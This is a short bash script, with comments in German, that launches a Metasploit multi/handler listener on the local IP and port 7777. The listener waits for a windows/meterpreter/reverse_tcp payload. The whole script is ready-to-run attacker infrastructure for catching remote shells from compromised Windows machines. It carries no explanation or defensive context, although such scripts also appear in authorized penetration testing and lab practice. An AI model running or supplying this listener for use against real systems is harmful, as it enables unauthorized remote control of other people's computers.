#!/bin/bash

# IP und Port als Variablen setzen
LHOST="$(hostname -I | awk '{print $1}')"
LPORT="7777"

msfconsole -q -x "
use exploit/multi/handler;
set payload windows/meterpreter/reverse_tcp;
set lhost $LHOST;
set lport $LPORT;
run;
"
